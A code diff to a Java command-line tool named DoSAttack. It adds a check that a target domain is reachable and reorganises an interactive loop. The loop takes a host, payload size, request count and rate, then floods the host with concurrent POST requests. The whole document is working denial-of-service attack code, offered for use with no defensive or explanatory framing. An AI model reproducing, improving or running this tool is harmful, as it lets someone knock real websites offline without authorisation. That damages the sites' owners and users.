@@ -13,13 +13,26 @@ public class DoSAttack {
         System.out.print("\033[H\033[2J");
         System.out.flush();
     }
+    public static boolean checkDomain(String domain) {
+        String urlStr = "http://" + domain;
+        try {
+            URL url = new URL(urlStr);
+            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+            connection.setRequestMethod("HEAD");
+            connection.setConnectTimeout(5000);
+            connection.setReadTimeout(5000);
+            int responseCode = connection.getResponseCode();
+            return (responseCode >= 200 && responseCode < 400);
+        } catch (IOException e) {
+            return false;
+        }
+    }
     public static void sendRequest(String domain, int[] requestCounter, byte[] data) {
         String urlStr = "http://" + domain;
         LocalDateTime requestTime = LocalDateTime.now();
         DateTimeFormatter formatter = DateTimeFormatter.ofPattern("HH:mm:ss.SSS");
         try {
             long startTime = System.currentTimeMillis();
-
             URL url = new URL(urlStr);
             HttpURLConnection connection = (HttpURLConnection) url.openConnection();
             connection.setRequestMethod("POST");
@@ -125,38 +138,50 @@ public class DoSAttack {
         System.out.print("\033[H\033[2J");
         System.out.flush();
         Scanner scanner = new Scanner(System.in);
+        String domain = null;
         while (true) {
             System.out.print("\033[36mHOST>> \033[37m");
-            String domain = scanner.nextLine();
+            domain = scanner.nextLine();
             clearScreen();
-            byte[] data = selectDataSize();
-            clearScreen();
-            int numberOfRequests = selectQuantity();
-            clearScreen();
-            double requestsPerSecond = selectDelay();
-            clearScreen();
-            int[] requestCounter = {0};
-            ExecutorService executor = Executors.newFixedThreadPool(10);
-            for (int i = 0; i < numberOfRequests; i++) {
-                executor.execute(() -> sendRequest(domain, requestCounter, data));
-                try {
-                    Thread.sleep((long) (1000 / requestsPerSecond));
-                } catch (InterruptedException e) {
-                    Thread.currentThread().interrupt();
-                }
+            if (checkDomain(domain)) {
+                System.out.println("\033[32mDomain is reachable. Starting the attack.\033[0m");
+                sleep(2);
+                clearScreen();
+                break;
+            } else {
+                System.out.println("\033[31mUnable to connect to the domain within 5 seconds. Please try again.\033[0m");
+                sleep(3);
+                clearScreen();
             }
-            executor.shutdown();
+        }
+        byte[] data = selectDataSize();
+        clearScreen();
+        int numberOfRequests = selectQuantity();
+        clearScreen();
+        double requestsPerSecond = selectDelay();
+        clearScreen();
+        int[] requestCounter = {0};
+        ExecutorService executor = Executors.newFixedThreadPool(10);
+        String finalDomain = domain;
+        for (int i = 0; i < numberOfRequests; i++) {
+            executor.execute(() -> sendRequest(finalDomain, requestCounter, data));
             try {
-                executor.awaitTermination(1, TimeUnit.HOURS);
+                Thread.sleep((long) (1000 / requestsPerSecond));
             } catch (InterruptedException e) {
                 Thread.currentThread().interrupt();
             }
-            System.out.println("\033[30m\033[47mEND | Wait 5 seconds\033[0m");
-            sleep(5);
-            clearScreen();
         }
+        executor.shutdown();
+        try {
+            executor.awaitTermination(1, TimeUnit.HOURS);
+        } catch (InterruptedException e) {
+            Thread.currentThread().interrupt();
+        }
+        System.out.println("\033[30m\033[47mEND | Wait 5 seconds\033[0m");
+        sleep(5);
+        clearScreen();
     }
     public static void main(String[] args) {
         startDoS();
     }
-}
+                    }
